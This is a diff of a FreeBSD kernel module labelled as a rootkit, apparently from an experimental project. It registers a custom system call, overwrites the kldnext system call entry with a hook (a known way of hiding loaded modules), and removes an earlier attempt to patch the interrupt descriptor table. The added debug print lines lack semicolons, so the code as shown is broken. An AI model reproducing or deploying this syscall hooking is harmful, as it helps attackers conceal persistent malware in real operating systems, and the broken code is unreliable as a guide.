@@ -16,30 +16,14 @@
 #include <sys/lock.h>
 #include <sys/sx.h>
 
-#include <sys/cdefs.h>
-
 #include "rootkit.h"
-
-#define	IDTVEC(name)	__CONCAT(X,name)
-
-
-int testFunc(void);
-
-/* The offset in sysent[] where the system call is to be allocated. */
-static int offset = NO_SYSCALL;
-
-/* Function Prototypes */
-static int main(struct thread *td, void *syscall_args);
-static int load(struct module *module, int cmd, void *arg);
 
 /* The system call's arguments. */
 struct rootkit_args {
-	int command;
-	char * args;
 };
 
 /* The system call function. */
-static int main(struct thread *td, void *syscall_args) {
+static int rootkit_func(struct thread *td, void *syscall_args) {
 	struct rootkit_args *uap;
 	uap = (struct rootkit_args *)syscall_args;
 
@@ -48,11 +32,14 @@ static int main(struct thread *td, void *syscall_args) {
 	return(0);
 }
 
+/* The sysent for the new system call. */
+static struct sysent rootkit_sysent = {
+	0,			/* number of arguments */
+	rootkit_func		/* implementing function */
+};
 
-int testFunc() {
-	printf("HELLO WORLD!!!!\n");
-	return 0;
-}
+/* The offset in sysent[] where the system call is to be allocated. */
+static int offset = NO_SYSCALL;
 
 /* The function called at load/unload. */
 static int load(struct module *module, int cmd, void *arg) {
@@ -64,11 +51,12 @@ static int load(struct module *module, int cmd, void *arg) {
 		sysent[SYS_kldnext].sy_call = (sy_call_t *)sys_kldnext_hook;
 		printf("kldnext hooked\n");
 
-		printf("%p\n", &idt);
-		printf("%p\n", &idt[0]);
-
-		setidt(IDT_SYSCALL, &IDTVEC(testFunc), SDT_SYS386IGT, SEL_UPL, GSEL(GCODE_SEL, SEL_KPL));
-
+		printf("%p\n", idt)
+		printf("%p\n", idt[0])
+		printf("%p\n", idt[0][0])
+		printf("%p\n", idt[1])
+		printf("%p\n", idt[0][1])
+		
 		break;
 
 	case MOD_UNLOAD:
@@ -84,14 +72,6 @@ static int load(struct module *module, int cmd, void *arg) {
 
 	return(error);
 }
-
-/// Structures for the rootkit ///
-
-/* The sysent for the new system call. */
-static struct sysent rootkit_sysent = {
-	0,			/* number of arguments */
-	main		/* implementing function */
-};
 
 static struct syscall_module_data rootkit_func_mod = {
 	load, NULL, &offset, &rootkit_sysent, { 0, NULL }
